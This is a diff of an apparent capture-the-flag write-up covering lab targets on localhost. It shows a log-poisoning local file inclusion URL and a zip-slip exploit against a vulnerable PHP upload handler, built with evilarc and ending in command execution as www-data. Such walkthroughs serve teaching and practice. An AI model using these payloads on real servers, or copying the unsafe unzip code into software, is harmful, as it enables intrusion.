@@ -264,19 +264,16 @@
         => http://localhost:8095/?game=../../../../var/log/apache2/access.log&cmd=id => BOOM
 
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+        [LEVEL 6]-TARGET: http://localhost:8096
 
-[Level 6]
-
-[*] Target: http://localhost:8096
-
-    - Like all the final bosses in all the games we played, this is one of them. Now, look at the index.php
+    - look at the index.php:
 
     session_start();
     if (!isset($_SESSION['dir'])) {
 
-        $_SESSION['dir'] = '/var/www/html/upload/' . bin2hex(random_bytes(16));
+        $_SESSION['dir'] = '/var/www/html/upload/' . bin2hex(random_bytes(16));    // Start file path in /var/www/html/upload/<random_bytes(16)>
     }
     $dir = $_SESSION['dir'];
 
@@ -289,18 +286,13 @@
           $file_name = $_FILES["file"]["name"];
           if(substr($file_name,-4,4) == ".zip")
           {
-            $result = _unzip_file_ziparchive($_FILES["file"]["tmp_name"],$dir); 
-            
-    // [?] This will unzip the uploaded zip file to /var/www/html/upload/<randomchar>/
-          
+            $result = _unzip_file_ziparchive($_FILES["file"]["tmp_name"],$dir);   // unzip file in /var/www/html/upload/<random_bytes(16)>
           }
           else
           {
             $newFile = $dir . "/" . $file_name; 
-            move_uploaded_file($_FILES["file"]["tmp_name"], $newFile); // [?] move file to the /var/www/html/upload/test.php
-            
-    // [?] This is a good one! But after reading apache2.conf, nah still not executable in this case
-          
+            move_uploaded_file($_FILES["file"]["tmp_name"], $newFile); // move file to the /var/www/html/upload/<random_bytes(16)>/<file>
+              
           }
 
        } catch(Exception $e) {
@@ -309,16 +301,14 @@
     }
     ...
 
-    => The mindset to solve this problem is to create a file name that contains a path traversal attack and zip it
+    => To solve this problem, you have to create a file with name that contains a path traversal attack and zip it
 
-    => But you know, we can't just do it normally! However, you can use this tool https://github.com/ptoomey3/evilarc/blob/master/evilarc.py
+    => You can use this tool https://github.com/ptoomey3/evilarc/blob/master/evilarc.py to solve it.
 
-    // [?] This is an old tool, you might want to fix it a little bit so that python3 can work smoothly
+    # python3 tool.py ./payload.php --depth 2 --os unix --output-file zip.zip
 
-    # python3 tool.py ./payload.php --depth 2 --os unix --output-file troy.zip
+    => Creating zip.zip containing ../../phppayload.php
 
-        Creating troy.zip containing ../../payload.php
+    => So! I uploaded the zip.zip and the back end extracted it successfully
 
-    => So! I uploaded the troy.zip and the back end extracted it successfully
-
-    [Final Result: RCE] http://localhost:8096/payload.php?cmd=id => uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+    => Successful upload: http://localhost:8096/phppayload.php?cmd=id => BOOM
